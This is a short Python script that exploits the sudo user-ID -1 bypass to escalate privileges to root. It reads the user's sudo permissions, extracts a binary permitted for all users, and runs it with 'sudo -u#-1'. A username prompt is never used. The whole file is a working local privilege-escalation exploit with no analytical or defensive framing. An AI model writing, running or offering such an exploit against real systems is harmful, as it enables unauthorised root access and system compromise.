#!/usr/bin/python3

import os

# Get current username
username = input("Enter current username: ")

# Check which binary the user can run with sudo
os.system("sudo -l > priv")

# Extract binaries the user can run with sudo
os.system("cat priv | grep 'ALL' | cut -d ')' -f 2 > binary")

# Read the extracted binary
with open("binary", "r") as binary_file:
    binary = binary_file.read().strip()

# Execute sudo exploit
print("Let's hope it works")
os.system(f"sudo -u#-1 {binary}")
